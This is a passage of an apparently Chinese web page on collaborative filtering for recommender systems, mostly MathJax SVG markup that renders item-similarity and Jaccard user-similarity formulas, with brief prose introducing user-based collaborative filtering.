0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1555, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1900, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2511.2, 0)"><path data-c="2229" d="M88 -21T75 -21T55 -7V200Q55 231 55 280Q56 414 60 428Q61 430 61 431Q77 500 152 549T332 598Q443 598 522 544T610 405Q611 399 611 194V-7Q604 -22 591 -22Q582 -22 572 -9L570 405Q563 433 556 449T529 485Q498 519 445 538T334 558Q251 558 179 518T96 401Q95 396 95 193V-7Q88 -21 75 -21Z"></path></g><g data-mml-node="mi" transform="translate(3400.4, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(4288.4, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4677.4, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(5089.4, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5478.4, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><g data-mml-node="mrow" transform="translate(1781.2, -710)"><g data-mml-node="mo"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(1166, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1555, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(1967, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2356, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><rect width="5956.4" height="60" x="120" y="220"></rect></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1778 -1460 1 2420"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-12"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(389, 0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(889, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(1389, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>避免热门物品干扰，改为</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 32.696ex"><svg style="vertical-align: -2.466ex; min-width: 32.696ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="6.063ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -1590)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2578, 0) translate(-2578, 0)"><g transform="translate(0 1590) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="4647.9 -1590 1 2680"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, 130)"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="TeXAtom" transform="translate(716, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1579.1, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(2634.8, 0)"><g data-mml-node="mrow" transform="translate(452.3, 710)"><g data-mml-node="mo"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(1166, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1555, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1900, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2511.2, 0)"><path data-c="2229" d="M88 -21T75 -21T55 -7V200Q55 231 55 280Q56 414 60 428Q61 430 61 431Q77 500 152 549T332 598Q443 598 522 544T610 405Q611 399 611 194V-7Q604 -22 591 -22Q582 -22 572 -9L570 405Q563 433 556 449T529 485Q498 519 445 538T334 558Q251 558 179 518T96 401Q95 396 95 193V-7Q88 -21 75 -21Z"></path></g><g data-mml-node="mi" transform="translate(3400.4, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(4288.4, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4677.4, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(5089.4, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5478.4, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><g data-mml-node="msqrt" transform="translate(220, -937.5)"><g transform="translate(1020, 0)"><g data-mml-node="mo"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(1166, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1555, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(1967, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2356, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(2634, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(2912, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(3800, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4189, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(4534, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4923, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><g data-mml-node="mo" transform="translate(0, 67.5)"><path data-c="221A" d="M263 249Q264 249 315 130T417 -108T470 -228L725 302Q981 837 982 839Q989 850 1001 850Q1008 850 1013 844T1020 832V826L741 243Q645 43 540 -176Q479 -303 469 -324T453 -348Q449 -350 436 -350L424 -349L315 -96Q206 156 205 156L171 130Q138 104 137 104L111 130L263 249Z"></path></g><rect width="5201" height="60" x="1020" y="857.5"></rect></g><rect width="6421" height="60" x="120" y="220"></rect></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1778 -1590 1 2680"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-13" transform="translate(0, 130)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(389, 0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(889, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(1389, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<h4 id="基于用户的协同过滤">基于用户的协同过滤</h4>
<p>（User-based collaborative filtering，UserCF） 找到和用户相似的其他用户，将其他用户感兴趣的产品推荐给用户。还有一种是“购买过XXX等用户也XXX”，算是这个方法的一个变种</p>
<p>计算相似度，N(u)是用户正反馈的集合，N(v)是用户负反馈物品的集合 Jaccard相似度：</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 33.249ex"><svg style="vertical-align: -2.172ex; min-width: 33.249ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="5.475ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -1460)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2578, 0) translate(-2578, 0)"><g transform="translate(0 1460) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="4770 -1460 1 2420"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="TeXAtom" transform="translate(716, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(572, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(850, 0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1987.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 